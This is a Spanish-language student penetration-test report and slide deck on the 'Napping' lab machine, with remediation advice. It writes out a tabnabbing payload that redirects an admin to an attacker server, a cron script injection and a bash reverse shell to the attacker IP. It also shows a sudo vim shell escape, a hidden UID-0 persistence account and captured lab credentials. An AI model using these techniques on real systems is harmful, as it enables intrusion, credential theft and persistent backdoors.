@@ -1,0 +1,725 @@
+--- PAGE 1 ---
+1 
+  
+ 
+ 
+ 
+  
+
+--- PAGE 2 ---
+2 
+ Contenido  
+ 
+2. Resumen Ejecutivo  ................................ ................................ ..........  3 
+3. Alcance (Scope)  ................................ ................................ ..............  3 
+4. Metodología aplicada  ................................ ................................ ...... 3 
+5. Fases de reconocimiento  ................................ ................................ . 4 
+6. Enumeración  ................................ ................................ ...................  5 
+Exploración de funcionamiento de sistema  ................................ ....... 9 
+7. Explotación  ................................ ................................ ..................... 11 
+8. Escalada de privilegios  ................................ ................................ ...16 
+9. Análisis de impacto (modelo CIA)  ................................ ................... 21 
+10. Recomendaciones técnicas  ................................ .......................... 22 
+11. Tabla de hallazgos  ................................ ................................ .......23 
+Referencias Bibliográficas  ................................ ................................ ..25 
+ 
+  
+--- PAGE 3 ---
+3 
+ 2. Resumen Ejecutivo  
+El presente documento detalla los resultados de una prueba de penetración (pentesting) realizada 
+sobre la máquina objetivo . El objetivo principal de esta evaluación es identificar, documentar y 
+analizar posibles vulnerabilidades de seguridad que puedan comprometer la confidencialidad, 
+integridad o disponibilidad del sistema. Durante la evaluación inicial, se logró identificar la 
+dirección IP del objetivo y se descubrieron servicios activos que presentan configuraciones 
+susceptibles a explotación, destacando  vectores de ataque orientados a servicios web . 
+3. Alcance (Scope)  
+ 
+El alcance de la presente evaluación de seguridad técnica se delimitó de manera estricta a la 
+máquina virtual denominada "Napping", operando dentro de un entorno de red local controlado. 
+Los vectores de análisis autorizados se concentraron de forma exclusi va en la dirección IP objetivo 
+identificada como 192.168.56.103.  
+Se autorizó la ejecución de técnicas de reconocimiento de red, escaneo de puertos, enumeración 
+profunda de servicios, análisis de vulnerabilidades en aplicaciones web y explotación de fallos de 
+configuración  
+El objetivo se centró únicamente en comprometer la integridad, confidencialidad y disponibilidad 
+de los servicios alojados en la IP definida.  
+4. Metodología aplicada  
+Para la ejecución de esta auditoría, se implementó una metodología técnica y estructurada basada 
+en los estándares de la industria para pruebas de penetración (como PTES u OWASP). El proceso 
+se dividió en fases secuenciales que permitieron un análisis exha ustivo y controlado del entorno:  
+• Fase 1 - Reconocimiento:  Se utilizaron técnicas de descubrimiento a nivel de capa de red 
+(ARP) para mapear el segmento local, identificar hosts activos y aislar la dirección de la 
+máquina objetivo de manera precisa antes de realizar interacciones directas.  
+• Fase 2 - Enumeración:  Se emplearon herramientas de escaneo activo para perfilar el 
+sistema operativo, identificar puertos lógicos abiertos y determinar las versiones exactas 
+de los servicios en ejecución (como SSH y HTTP). Se incluyó el descubrimiento de 
+directorios ocultos y el análisis de configuraciones inseguras a nivel web (como el manejo 
+de cookies de sesión).  
+• Fase 3 - Explotación:  A partir de los vectores de ataque identificados en la enumeración, 
+se procedió a la interacción con la aplicación web vulnerable. Se priorizó el análisis de 
+entradas de usuario no sanitizadas y funcionalidades críticas (como formularios de registro 
+e ing reso de enlaces) para intentar ejecutar código arbitrario, falsificar peticiones (SSRF) o 
+evadir mecanismos de autenticación, buscando establecer un punto de apoyo inicial en el 
+servidor.  
+• Fase 4 - Post -explotación y Escalada de Privilegios:  Una vez establecido el acceso al 
+sistema objetivo, la metodología contempla la enumeración interna del sistema operativo 
+para identificar vectores de escalada, tareas programadas inseguras o binarios con 
+--- PAGE 4 ---
+4 
+ permisos mal configurados (SUID) que permitan elevar los privilegios de un usuario 
+estándar a administrador (root).  
+5. Fases de r econocimiento  
+ 
+Se inició la fase de reconocimiento de red obteniendo privilegios administrativos mediante el 
+comando sudo su  
+Posteriormente, se utilizó la herramienta netdiscover  para identificar los hosts activos dentro 
+del segmento de red . 
+ 
+Durante el análisis del tráfico ARP, se descartó la dirección IP 192.168.56.1, al intuir que 
+correspondía al enrutador (router) por ocupar los primeros números del rango de red . Siguiendo 
+este criterio, se determinó que las direcciones con terminaciones más altas tenían mayor 
+probabilidad de corresponder a la máquina objetivo, identificando finalmente la IP 
+192.168.56.103 . Como alternativas complementarias para esta fase, se consideró la viabilidad de 
+utilizar otras herramientas como Spider y Legion . 
+Legión : Herramienta semiautomatizada para pruebas de penetración de redes.    
+Este paquete contiene una herramienta de código abierto, fácil de usar, súper extensible y 
+semiautomatizada para pruebas de penetración de redes que ayuda en el descubrimiento, 
+reconocimiento y explotación de sistemas de información.  
+Spider : Rastreador web rápido escrito en Go  
+Este paquete contiene un rastreador web rápido escrito en Go. Las características son: - Rastreo 
+web rápido - Fuerza bruta y análisis de sitemap.xml - Análisis de robots.txt - Generación y 
+verificación de enlaces desde archivos JavaScript - Buscador de enl aces - Búsqueda de AWS -S3 
+desde la fuente de respuesta - Búsqueda de subdominios desde la fuente de respuesta - 
+
+--- PAGE 5 ---
+5 
+ Obtención de URL de Wayback Machine, Common Crawl, VirusTotal, AlienVault - Formato de 
+salida fácil de usar con Grep - Compatibilidad con entrada Burp - Rastreo de múltiples sitios en 
+paralelo - Muestras aleatorias de agentes de usuario móviles/we  
+6. Enumeración  
+ 
+Una vez confirmada la IP objetivo, se procedió a la fase de enumeración profunda utilizando la 
+herramienta Nmap con la bandera -A sobre la dirección 192.168.56.103  
+ 
+ 
+Es imperativo mencionar que el escaneo con la bandera -A es altamente intrusivo; sin embargo, 
+su ejecución fue posible y justificada al tratarse de un entorno controlado . 
+El escaneo reveló los siguientes puertos abiertos y servicios:  
+Puerto 22/tcp - Servicio SSH (OpenSSH 8.2p1):  Se identificó este puerto en estado abierto . El 
+servicio Secure Shell (SSH) facilita el acceso remoto cifrado y la administración por línea de 
+comandos. Su reconocimiento es crítico, ya que representa un punto de entrada directo a la 
+terminal del sistema operativo; si se logran recopilar credencial es válidas o se identifican 
+vulnerabilidades públicas (CVEs) para la versión específica, se puede obtener un compromiso 
+inicial del sistema o utilizar el servicio para  establecer túneles y mantener persistencia.  
+Puerto 80/tcp - Servicio HTTP (Apache httpd 2.4.41):  Se detectó el servicio web Apache en 
+funcionamiento y expuesto . Este protocolo sirve la interfaz y lógica de la aplicación web. Su 
+evaluación es de máxima prioridad debido a que suele ser el vector de ataque más accesible y 
+propenso a errores de configuración o de código; adicionalmente, se determinó que la versión de 
+Apache detectada es antigua . Identificar servicios web desactualizados es fundamental porque 
+
+--- PAGE 6 ---
+6 
+ incrementa drásticamente la probabilidad de ejecutar exploits conocidos, razón por la cual se 
+definió este puerto como el punto de inicio para la fase de explotación . 
+Ausencia de bandera de seguridad en cookie de sesión (PHPSESSID):  Se observó que la cookie de 
+sesión generada en el portal de autenticación (login ) carece del atributo de seguridad "httponly" . 
+Este indicador revela que el token de sesión no está protegido contra el acceso desde el lado del 
+cliente. En un escenario de ataque, reconocer esta mala configuración es vital porque viabiliza el 
+secuestro de sesiones (Session Hijacking) si se logra iny ectar código malicioso a través de una 
+vulnerabilidad de Cross -Site Scripting (XSS).  
+Huella del sistema operativo (Linux 4.15 – 5.19) y Dirección MAC:  Se logró extraer la dirección 
+MAC y perfilar el sistema subyacente, estimando un rango de versión del kernel de Linux . La 
+técnica de perfilado del sistema operativo (OS fingerprinting) es indispensable para la planificación 
+del ataque, ya que permite al auditor descartar cargas útiles (payloads) incompatibles y enfocar la 
+investigación en vulnerabilidades de escalada de privilegios locales (LPE) que afecten 
+exclusivamente a la arquitectura y versión del kernel descubiertas.  
+ 
+ 
+Al acceder a la dirección objetivo a través del navegador web, se descubrió un portal de 
+autenticación (login)  
+ 
+
+--- PAGE 7 ---
+7 
+ Avistamiento de directorios  
+Para el avistamiento de directorios, se ejecutó inicialmente la herramienta Nikto,  la cual logró 
+encontrar únicamente el archivo config.php  
+ 
+Encontró solamente config.php  
+ 
+ 
+
+--- PAGE 8 ---
+8 
+   
+Para ampliar el descubrimiento, se utilizó DirBuster configurado para buscar archivos con 
+extensiones html , txt y php. 
+ 
+Este proceso resultó en la identificación de rutas adicionales críticas, incluyendo register.php , 
+index.php  y welcome.php  
+El descubrimiento de estos recursos es un paso obligado para mapear la superficie de ataque real; 
+los archivos de configuración ( config.php ) son objetivos de alto valor porque frecuentemente 
+exponen credenciales de bases de datos embebidas en el código, mientras que los formularios 
+ocultos (register.php ) revelan nuevas funcionalidades con las que se puede interactuar para 
+probar técnicas de inyección, evasión de autenticación o manipulación de parámetros.  
+
+--- PAGE 9 ---
+9 
+ Exploración de funcionamiento de sistema  
+ 
+  
+Finalmente, se interactuó con la aplicación web registrando un usuario de prueba en 
+register.php  utilizando la contraseña "123456"  
+ 
+
+--- PAGE 10 ---
+10 
+  
+  
+Tras autenticarse exitosamente en index.php , la aplicación redirigió al archivo welcome.php , el 
+cual presenta una interfaz de "promoción de blogs gratuitos" que solicita al usuario ingresar un 
+enlace web para ser revisado por un administrador  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+--- PAGE 11 ---
+11 
+ 7. Explotación  
+ 
+Durante esta fase, se procedió a explotar el formulario de envío de enlaces ubicado en 
+welcome.php. Se identificó que la aplicación era susceptible a un ataque de Tabnabbing  (o Tab 
+Hijacking ), una técnica que aprovecha el comportamiento de las pestañas del navegador y el 
+objeto window.opener para redirigir una pestaña en segundo plano hacia un sitio malicioso  
+Se verificó la dirección IP local de la máquina atacante (192.168.56.101) mediante el comando 
+ifconfig y se creó un directorio de trabajo denominado Napping.  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+--- PAGE 12 ---
+12 
+ Creación del Payload:  Se elaboró un archivo malicioso en formato HTML (payload.html) diseñado 
+para ejecutar código JavaScript. El script utiliza la instrucción 
+window.opener.parent.location.replace('http://192.168.56.101:8000/home.html'); para forzar a la 
+pestaña padre (la ses ión del administrador) a redirigirse hacia un servidor controlado por el 
+atacante.  
+ 
+ 
+ 
+Alojamiento del Payload:  Se levantó un servidor web local utilizando el módulo de Python 
+http.server en el puerto 80 para servir el archivo payload.html  
+ 
+
+--- PAGE 13 ---
+13 
+  
+ 
+Ejecución del ataque:  Se envió la URL del payload (http://192.168.56.101/payload.html) a través 
+del formulario de la aplicación web víctima, el cual está diseñado para que un administrador revise 
+los enlaces. Paralelamente, se configuró un listener  con Netcat en el puerto 8000 (nc -lvnp 8000) 
+para interceptar la respuesta.  
+ 
+
+--- PAGE 14 ---
+14 
+ Obtención de credenciales:  Tras la interacción del administrador simulado con el enlace, el script 
+redirigió su sesión, capturando una petición POST en el puerto 8000. Dicha petición contenía las 
+credenciales en texto plano correspondientes al usuario daniel con la contraseña 
+C@ugh tm3napping123  
+ 
+ 
+ 
+  
+
+--- PAGE 15 ---
+15 
+ Acceso inicial:  Utilizando las credenciales obtenidas, se estableció una conexión SSH exitosa hacia 
+la máquina objetivo (192.168.56.103), logrando el compromiso inicial del sistema con los 
+privilegios del usuario  
+ 
+  
+
+--- PAGE 16 ---
+16 
+ 8. Escalada de privilegios  
+ 
+La fase de post -explotación y escalada se dividió en dos etapas: un movimiento lateral hacia un 
+usuario con mayores privilegios y la posterior escalada vertical a administrador del sistema (root).  
+Movimiento Lateral (Usuario adrian ) 
+Enumeración local:  Al explorar los directorios de los usuarios del sistema, se identificaron los 
+archivos query.py y site_status.txt dentro del directorio /home/adrian  
+ 
+Análisis de tareas programadas:  Se determinó que query.py es un script ejecutado de manera 
+periódica y automatizada (mediante un cron job ) bajo el contexto del usuario adrian, cuyo 
+propósito original era verificar el estado de un sitio web local  
+ 
+
+--- PAGE 17 ---
+17 
+ Modificación del script:  Se constató que el grupo administrators, al cual pertenece el usuario 
+daniel, poseía permisos de escritura sobre query.py. Se procedió a editar el archivo para importar 
+la librería os e inyectar el comando os.system('/usr/bin/bash /dev/shm/connection.sh')  
+ 
+ 
+El módulo os permite ejecutar comandos del sistema operativo directamente desde Python.  
+ 
+ 
+Despliegue de Reverse Shell:  Se creó el archivo ejecutable /dev/shm/connection.sh en la memoria 
+compartida del sistema. En este archivo se configuró una reverse shell  en Bash utilizando la 
+sintaxis bash -c 'bash -i >& /dev/tcp/192.168.56.101/8000 0>&1'  
+ 
+
+--- PAGE 18 ---
+18 
+  
+Una reverse shell (o shell  inversa) es una técnica donde la máquina víctima inicia una conexión 
+hacia el atacante, permitiéndole ejecutar comandos de forma remota  
+ 
+#!/bin/bash: Indica que el script debe ejecutarse usando el intérprete Bash.  
+bash -c ‘...’:  Ejecuta un comando dentro de una instancia de Bash.  
+bash -i: Inicia una shell interactiva (permite ingresar comandos  
+>& /dev/tcp/192.168.56.101/8000  
+Esto envía toda la salida estándar (stdout) y la salida de errores (stderr) a un socket TCP con 
+destino:  
+• IP: 192.168. 56.101  
+• Puerto: 8000 
+• Es decir: conecta a tu máquina atacante  
+0>&1 : Redirige la entrada estándar (stdin) hacia el mismo socket, permitiendo interacción  
+ 
+Ejecución y estabilización:  Tras configurar un listener  en el puerto 8000, se esperó la ejecución 
+automática del cron job . Se recibió una conexión exitosa obteniendo una sesión interactiva como 
+el usuario adrian.  
+ 
+
+--- PAGE 19 ---
+19 
+ Posteriormente, se estabilizó la consola (TTY) empleando el intérprete de Python (pty.spawn), 
+suspendiendo el proceso (Ctrl + Z) y configurando la terminal local con stty raw -echo.  
+ 
+import pty:  Importa el módulo pty (pseudo -terminal) de Python, que permite crear terminales 
+virtuales.  
+pty.spawn("/bin/bash"):  Crea un pseudo -terminal interactivo y ejecuta dentro de él bash. Es 
+decir: convierte tu shell basura (netcat / reverse shell básica) en un Bash interactivo completo  
+ 
+ 
+Ctrl + Z:  Esto suspende el proceso y te regresa a tu terminal local.  
+stty raw:  Configura tu terminal en modo “raw”, es decir: las teclas se envían directamente a la 
+shell víctima, sin interferencia de tu terminal local  
+stty -echo:  Desactiva que tu teclado se imprima doble en pantalla (eco).  
+fg: Vuelve a poner en foreground el proceso suspendido (netcat), recuperando la reverse shell  
+ 
+ 
+ 
+ 
+
+--- PAGE 20 ---
+20 
+ Escalada Vertical (Usuario root ) y Persistencia  
+Abuso de Sudoers:  Al ejecutar el comando sudo -l para verificar los privilegios delegados al usuario 
+adrian, se descubrió la capacidad de ejecutar el editor /usr/bin/vim como root sin necesidad de 
+proveer una contraseña (NOPASSWD)  
+ 
+Ejecución de Bypass:  Basándose en técnicas documentadas (como GTFOBins), se explotó esta 
+mala configuración ejecutando el comando sudo /usr/bin/vim -c ':!/bin/sh'. Esto permitió escapar 
+del entorno restringido del editor y generar una consola interactiva con privilegios máxim os (root).  
+ 
+Mantenimiento de acceso:  Para asegurar la persistencia en el sistema, se añadió un usuario oculto 
+con identificadores administrativos (UID 0 y GID 0) denominado Equipo4  (con contraseña: 
+123456@) , validando su creación en el archivo /etc/passwd.   
+ 
+ 
+ 
+ 
+ 
+
+--- PAGE 21 ---
+21 
+ 9. Análisis de impacto (modelo CIA)  
+ 
+El compromiso sistemático de la infraestructura objetivo, que culminó en la obtención de 
+privilegios máximos (root), representa un riesgo crítico para las operaciones de la organización. A 
+continuación, se detalla el impacto estructurado bajo los tres pila res fundamentales de la 
+seguridad de la información (Modelo CIA):  
+• Confidencialidad (Nivel de impacto: Crítico):  La escalada de privilegios a administrador 
+otorgó acceso irrestricto a la totalidad del sistema de archivos. Se comprobó que un 
+atacante puede leer información sensible de cualquier usuario, incluyendo credenciales de 
+bases de datos codificadas en texto p lano dentro de scripts internos (como se evidenció 
+en el archivo del_users.py que contenía el usuario "adrian" y su contraseña de base de 
+datos). Esto expone datos corporativos, propiedad intelectual y registros  de usuarios a la 
+exfiltración y el espionaje.  
+• Integridad (Nivel de impacto: Crítico):  Se demostró la capacidad de alterar el 
+funcionamiento lógico de los procesos internos del servidor. Al contar con permisos de 
+escritura sobre el script automatizado query.py, fue posible inyectar código arbitrario para 
+alterar el comportamiento esperado d el sistema. A nivel de superusuario, un actor 
+malicioso tiene la capacidad de modificar registros de auditoría (logs) para borrar sus 
+huellas, alterar el código fuente de la aplicación web alojada o manipular la infor mación 
+de la base de datos.  
+• Disponibilidad (Nivel de impacto: Crítico):  El control absoluto sobre la máquina virtual 
+Napping faculta a un atacante para interrumpir por completo los servicios operativos. Se 
+observó que el sistema posee scripts (como del_users.py) con la instrucción TRUNCATE 
+TABLE users, lo que implica que un a tacante podría destruir bases de datos enteras de 
+manera instantánea. Además, el acceso root  permite la ejecución de ataques de 
+denegación de servicio (DoS) locales, el apagado del servidor o el despliegue de 
+ransomware  para secuestrar la infraestructura.  
+  
+--- PAGE 22 ---
+22 
+ 10. Recomendaciones técnicas  
+ 
+Para mitigar los riesgos identificados y fortalecer la postura de seguridad del servidor, se propone 
+la implementación inmediata de los siguientes controles técnicos y administrativos:  
+Mitigación de vulnerabilidades web (Tabnabbing)  Se identificó que el comportamiento de las 
+pestañas en el portal web permite ataques de phishing  avanzado. Para remediar esta 
+vulnerabilidad en la lógica de la aplicación web, se debe sanitizar el manejo de enlaces externos. 
+Se requiere implementar los atributos rel="noopener noreferrer" en todas las etiquetas HTML de 
+anclaje (<a>) que utilicen el at ributo target="_blank". Esta medida técnica neutralizará el acceso 
+de las páginas abiertas al objeto window.open er, previniendo redirecciones maliciosas de la 
+pestaña de origen.  
+Restricción de permisos y control de acceso (Archivos y Tareas programadas)  Se observó una 
+violación al principio de menor privilegio en la gestión de archivos locales. El archivo query.py, 
+ejecutado mediante un proceso automatizado ( cron job ) por el usuario adrian, poseía permisos de 
+escritura para usuarios pertenecientes al grupo administrators. Se recomienda auditar 
+recursivamente los permisos de los directorios de usuario utilizando los comandos chown y 
+chmod. Los scripts  invocados por tareas programada s deben tener permisos estrictos configurados 
+en 755 o 700, garantizando que únicamente el propietario legítimo (o el usuario root) tenga la 
+capacidad de modificarlos.  
+Endurecimiento de políticas de Sudoers (Hardening)  Se detectó una configuración insegura en el 
+archivo /etc/sudoers que delegaba la ejecución del binario /usr/bin/vim sin requerimiento de 
+autenticación (NOPASSWD) para el usuario adrian. Dado que herramientas interactivas como vim 
+poseen capacidades de escape hacia la consola del sistema operativo (:!/bin/sh), esto permite la 
+evasión de restricciones y la escalada directa a superusuario. Se debe remover inmediatamente 
+esta directiva del archivo sudoers . Cual quier ejecución de herramientas interactivas con privilegios 
+elevados debe ser estrictamente justificada, monitoreada y requerir siempre credenciales de 
+autenticación vig
+--- PAGE 23 ---
+23 
+ 11. Tabla de hallazgos  
+ID Vulnerabilidad 
+Identificada  Severidad  Evidencia Técnica  Impacto en el Negocio  Recomendación de 
+Remediación  
+VULN -
+01 Tabnabbing / Tab 
+Hijacking  
+(Manipulación de 
+referencias cruzadas 
+en el navegador)  Alta Redirección exitosa de la sesión del 
+administrador hacia un portal 
+falsificado mediante un payload  
+HTML 
+(window.opener.parent.location.re
+place). Captura de credenciales del 
+usuario daniel en texto plano.  Robo de credenciales 
+corporativas mediante 
+phishing  avanzado, 
+permitiendo el acceso inicial 
+no autorizado a la red interna 
+y a los paneles de 
+administración.  Implementar 
+estrictamente los 
+atributos rel="noopener 
+noreferrer" en todos los 
+hipervínculos externos 
+procesados por la 
+aplicación.  
+VULN -
+02 Configuración 
+insegura de permisos 
+de archivos (Escalada 
+de Privilegios Local - 
+Horizontal)  Alta El archivo query.py presentaba 
+permisos de escritura ( -rw-rw-r--) 
+para el grupo administrators. Se 
+inyectó una reverse shell  
+(os.system) que fue ejecutada por 
+el cron del usuario adrian.  Compromiso de cuentas de 
+usuarios adyacentes y 
+ejecución de código arbitrario 
+bajo contextos ajenos. Falla 
+en el aislamiento de entornos 
+de usuario.  Auditar el sistema de 
+archivos local y aplicar el 
+principio de mínimo 
+privilegio. Restringir la 
+escritura de scripts  
+automatizados 
+únicamente a su 
+propietario legítimo.  
+VULN -
+03 Configuración de 
+directivas inseguras 
+en sudoers (Escalada 
+de Privilegios a Root ) Crítica  Verificación del privilegio (root) 
+NOPASSWD: /usr/bin/vim 
+ejecutando el comando sudo -l. 
+Escape exitoso hacia una terminal 
+interactiva invocando sudo 
+/usr/bin/vim -c ':!/bin/sh'.  Pérdida total de la 
+confidencialidad, integridad y 
+disponibilidad del servidor. El 
+atacante obtiene control 
+absoluto de la infraestructura 
+operativa y los datos alojados.  Suprimir la directiva 
+NOPASSWD para 
+herramientas interactivas 
+que soporten el escape a 
+shell . Restringir el uso de 
+sudo a comandos 
+estrictamente necesarios 
+y controlados.  
+--- PAGE 24 ---
+24 
+ VULN -
+04 Almacenamiento 
+inseguro de 
+credenciales de Base 
+de Datos en texto 
+plano  Media  Archivo del_users.py localizado 
+bajo el usuario root , el cual 
+contiene las credenciales de 
+conexión (user="adrian", 
+password="P@sswr0d456") 
+integradas en el código fuente.  Exposición de credenciales de 
+bases de datos internas que 
+pueden ser reutilizadas para 
+realizar movimientos laterales 
+o acceder a datos 
+corporativos directamente.  Utilizar variables de 
+entorno seguras o 
+bóvedas de contraseñas 
+(Key Vaults ) para la 
+gestión de secretos. 
+Evitar hardcodear  
+credenciales en cualquier 
+script  de administración.  
+ 
+ 
+--- PAGE 25 ---
+25 
+  
+Referencias Bibliográficas  
+ 
+• GTFOBins. (s.f.). GTFOBins: Bypass local security restrictions . Recuperado de 
+https://gtfobins.org/   
+• López Contreras, S. (2026). Descubrimiento y Explotación de Vulnerabilidades: Lab Napping  
+[Material de clase]. Ingeniería en Tecnologías de la Información, Universidad Politécnica 
+de San Luis Potosí.  
+• OWASP Foundation. (s.f.). OWASP Web Security Testing Guide (WSTG) . Recuperado de 
+https://owasp.org/www -project -web -security -testing -guide/  
+• PentestMonkey. (s.f.). Reverse Shell Cheat Sheet . Recuperado de 
+https://pentestmonkey.net/cheat -sheet/shells/reverse -shell -cheat -sheet   
+• The Penetration Testing Execution Standard (PTES). (s.f.). PTES Technical Guidelines . 
+Recuperado de http://www.pentest -standard.org/  
+ 
+--- PAGE 26 ---
+PENTESTING DE 
+NAPPING 1.0.1
+Red Team Report -Evaluación de SeguridadA C T I V I D A D  # 1 1
+--- PAGE 27 ---
+—
+Contexto del Engagement
+Evaluación de Seguridad -Napping 1.0.1 
+Agenda
+AgendaEvaluación de 
+"Napping 1.0.1".01
+Objetivo :
+Identificar 
+vulnerabilidades 
+explotables con 
+impacto real en 
+negocio.02
+Alcance :
+Sistema en entorno 
+controlado 
+(VirtualBox -red 
+Host Only ).03
+Perfil de atacante :
+Externo sin 
+credenciales.04
+--- PAGE 28 ---
+—
+Metodología Aplicada
+Basada en: OWASP Testing Guide y PTES (Penetration Testing Execution Standard)
+Reconocimiento de 
+red
+Herramientas :
+•Legion
+•SpiderEnumeración de 
+servicios
+Herramientas:
+•Nmap
+Puertos:
+•22/tcp
+•80/tcpIdentificación de 
+vectores de ataque
+Vectores :
+•PHPSESSID 
+expuesto
+•OSFingerprint
+•TabnabbingExplotación
+Utilización:
+•Malicious
+Payload
+•Admin
+credentials
+leakingEscalada de 
+privilegios
+Utilización:
+•cron poisoning
+•Query.py 
+poisoning
+•vim poisoningValidación de 
+Impacto
+Validación:
+•Creación de 
+cuenta local
+
+--- PAGE 29 ---
+—
+Nivel General de Riesgo
+Nivel ALTO
+Resumen:
+•Se identificaron múltiples servicios 
+expuestos innecesariamente .
+•Se logró acceso inicial al sistema .
+•Se obtuvo escalada a privilegios 
+administrativos ( root ).Impacto:
+•Compromiso total del sistema
+•Acceso a información sensible
+•Potencial movimiento lateral
+Impact o
+--- PAGE 30 ---
+—
+Hallazgos Críticos
+Hallazgo 1: Servicios expuestos innecesarios
+Servicios Identificados:
+• Puerto 22: SSH
+• Puerto 80: HTTP (aplicación web )
+• Otros servicios internos potencialmente accesibles
+• Cron
+• Query.py
+• vimRiesgo:
+• Superficie de ataque amplia
+• Posibilidad de explotación remota
+Hallazgo 2: Aplicación web vulnerable
+Observaciones:
+• Funcionalidades web sin validación adecuada
+• Posible exposición de rutas sensibles
+• Manejo inseguro de entradas de usuarioRiesgo:
+• Punto de entrada inicial al sistema
+• Ejecución de acciones no autorizadas
+--- PAGE 31 ---
+—
+Hallazgos Críticos
+Hallazgo 3: Gestión insegura de credenciales
+Observaciones:
+• Presencia de credenciales débiles o reutilizadas
+• Posible exposición en archivos del sistemaRiesgo:
+• Acceso a cuentas internas
+• Escalada de privilegios horizontal
+Hallazgo 4: Escalada de privilegios
+Observaciones:
+• Configuraciones incorrectas en permisos del sistema
+• Posible ejecución de binarios con privilegios elevadosResultado:
+• Acceso como usuario root
+Riesgo:
+• Control total del sistema comprometido
+--- PAGE 32 ---
+—
+Escenario de Impacto Empresarial
+Cadena de ataque:
+1.Identificación de servicios 
+expuestos (HTTP/SSH )
+2.Interacción con aplicación web 
+vulnerable
+3.Obtención de acceso inicial
+4.Uso de credenciales encontradas
+5.Escalada a privilegios rootConsecuencias:
+•Exfiltración de datos sensibles
+•Interrupción de servicios críticos
+•Compromiso de otros sistemas 
+internos
+•Daño reputacional y regulatorio
+Cadena de ataque
+--- PAGE 33 ---
+—
+Matriz de Riesgo
+Mediciones de impacto
+Vulnerabilidad Probabilidad Impacto Nivel 
+Servicios expuestos Alta Media Medio
+Aplicación web vulnerable Alta Alta Alta
+Credenciales inseguras Alta Alta Alta
+Escalada de privilegios Media Alta Alta
+--- PAGE 34 ---
+—
+Recomendaciones Estratégicas
+To-do
+Reducir superficie 
+de ataque (cerrar 
+puertos 
+innecesarios)
+Implementar 
+validación robusta 
+en aplicaciones 
+web
+Fortalecer políticas 
+de contraseñas
+Aplicar principio de 
+mínimo privilegio
+Segmentar 
+servicios críticos
+Implementar 
+monitoreo y 
+alertamiento
+Recomendaciones
+--- PAGE 35 ---
+—
+Roadmap de Remediación
+No more incidents
+Corto Plazo (0 -30 días):
+•Cierre de servicios no 
+esenciales
+•Cambio de credenciales 
+comprometidas
+•Corrección de 
+vulnerabilidades críticas 
+webMediano Plazo (1 -3 meses):
+•Hardening del sistema 
+operativo
+•Implementación de 
+controles de acceso
+•Auditoría de permisosLargo Plazo (3 -6 meses):
+•Programa continuo de 
+pruebas de seguridad
+•Implementación de SIEM / 
+monitoreo
+•Capacitación en seguridad
+Tips
+--- PAGE 36 ---
+—
+Conclusión 
+Final Thoughts
+El sistema evaluado presenta una combinación 
+de:
+•Exposición innecesaria de servicios
+•Debilidades en la aplicación web
+•Configuraciones inseguras
+Esto permitió a un atacante externo 
+comprometer completamente el sistema .Mensaje clave:
+La organización debe priorizar la reducción de la 
+superficie de ataque y fortalecer sus controles de 
+acceso.
+Recomendación final:
+Adoptar un enfoque proactivo de ciberseguridad 
+basado en prevención, detección y respuesta 
+continua.
